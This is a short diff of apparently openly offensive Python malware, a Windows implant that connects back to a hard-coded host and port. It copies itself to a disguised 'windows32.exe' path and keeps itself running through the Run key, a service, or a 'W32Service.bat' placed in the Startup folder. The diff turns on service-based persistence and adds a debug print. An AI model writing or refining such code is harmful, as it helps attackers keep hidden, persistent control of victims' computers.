@@ -15,8 +15,8 @@ HOST = '192.168.0.94'
 PORT = 54321
 pers_loc = os.environ['appdata'] + '\\Microsoft\\Windows\\System32\\windows32.exe'
 persist_run = False     # Implements persistence through RUN registry key - User Permissions
-persist_srv = False      # Implements persistence through Services registry key - NT Authority/System permissions
-persist_stu = True      # Implements persistence through Start Up user folder - User permissions
+persist_srv = True      # Implements persistence through Services registry key - NT Authority/System permissions
+persist_stu = False      # Implements persistence through Start Up user folder - User permissions
 isimage = False         # Will open an image the first time it executes itself
 
 
@@ -166,6 +166,7 @@ def persistence_stu(_pers_loc):
         create_dir(_pers_loc)
         shutil.copyfile(sys.executable, _pers_loc)
         startup = os.environ['appdata'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\W32Service.bat'
+        print("Create BAT file: ", startup)
         if not os.path.exists(startup):
             with open(startup, 'wb') as f:
                 f.write(_pers_loc)
